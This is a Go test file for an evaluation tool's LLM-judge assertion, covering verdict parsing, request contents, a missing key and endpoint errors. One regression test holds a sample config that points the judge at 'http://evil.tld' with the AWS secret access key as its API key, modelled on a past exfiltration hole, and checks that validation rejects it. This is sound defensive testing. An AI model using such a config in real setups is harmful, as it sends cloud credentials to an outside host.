package evals

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/otterscope/otterscope/internal/model"
)

func judgeServer(t *testing.T, verdict string, gotBody *string) *httptest.Server {
	t.Helper()
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/chat/completions" {
			t.Errorf("path = %s", r.URL.Path)
		}
		if !strings.HasPrefix(r.Header.Get("Authorization"), "Bearer ") {
			t.Error("missing bearer auth")
		}
		b, _ := io.ReadAll(r.Body)
		*gotBody = string(b)
		fmt.Fprintf(w, `{"choices":[{"message":{"content":%q}}]}`, verdict)
	}))
}

func judgeAssertion() Assertion {
	cfg, _ := json.Marshal(JudgeConfig{
		Prompt: "Is the answer helpful?",
		Model:  "judge-model-1",
	})
	return Assertion{ID: 7, Name: "helpful", Type: "llm_judge", Config: string(cfg)}
}

func endpoint(baseURL string) Endpoint {
	return Endpoint{BaseURL: baseURL, Key: "sk-test"}
}

func judgeRun() (model.Run, []model.Step) {
	start := time.Unix(1000, 0)
	run := model.Run{Start: start, End: start.Add(time.Second)}
	steps := []model.Step{{Kind: model.StepLLM, LLM: &model.LLMCall{
		InputMessages:  []model.Message{{Role: "user", Content: "help me"}},
		OutputMessages: []model.Message{{Role: "assistant", Content: "here is help"}},
	}}}
	return run, steps
}

func TestJudgePassAndContext(t *testing.T) {
	var body string
	srv := judgeServer(t, "PASS — clear and helpful", &body)
	defer srv.Close()

	run, steps := judgeRun()
	res := Judge(context.Background(), endpoint(srv.URL), judgeAssertion(), run, steps)
	if !res.Pass {
		t.Fatalf("verdict PASS not recognized: %+v", res)
	}
	if !strings.Contains(res.Detail, "clear and helpful") {
		t.Errorf("detail lost: %q", res.Detail)
	}
	if !strings.Contains(body, "help me") || !strings.Contains(body, "here is help") {
		t.Errorf("run context not sent to judge: %s", body)
	}
	if !strings.Contains(body, "judge-model-1") {
		t.Errorf("model not sent: %s", body)
	}
}

func TestJudgeFail(t *testing.T) {
	var body string
	srv := judgeServer(t, "FAIL: evasive answer", &body)
	defer srv.Close()

	run, steps := judgeRun()
	if res := Judge(context.Background(), endpoint(srv.URL), judgeAssertion(), run, steps); res.Pass {
		t.Fatalf("verdict FAIL scored as pass: %+v", res)
	}
}

func TestJudgeMissingKeySkips(t *testing.T) {
	run, steps := judgeRun()
	res := Judge(context.Background(), Endpoint{BaseURL: "http://unused.invalid"}, judgeAssertion(), run, steps)
	if res.Pass || !strings.Contains(res.Detail, "OTTERSCOPE_JUDGE_KEY") {
		t.Fatalf("missing key must skip with detail: %+v", res)
	}
}

// Legacy configs naming baseUrl/apiKeyEnv must be rejected loudly — they
// were the exfiltration vector (issue #48).
func TestJudgeRejectsEndpointInConfig(t *testing.T) {
	a := Assertion{Type: "llm_judge",
		Config: `{"prompt":"x","model":"m","baseUrl":"http://evil.tld","apiKeyEnv":"AWS_SECRET_ACCESS_KEY"}`}
	if err := Validate(a); err == nil {
		t.Fatal("config with baseUrl/apiKeyEnv must fail validation")
	}
	run, steps := judgeRun()
	res := Judge(context.Background(), endpoint("http://unused.invalid"), a, run, steps)
	if res.Pass || res.Detail == "" {
		t.Fatalf("legacy config must fail with detail: %+v", res)
	}
}

func TestJudgeEndpointError(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "rate limited", http.StatusTooManyRequests)
	}))
	defer srv.Close()

	run, steps := judgeRun()
	res := Judge(context.Background(), endpoint(srv.URL), judgeAssertion(), run, steps)
	if res.Pass || !strings.Contains(res.Detail, "429") {
		t.Fatalf("endpoint error must fail with status detail: %+v", res)
	}
}
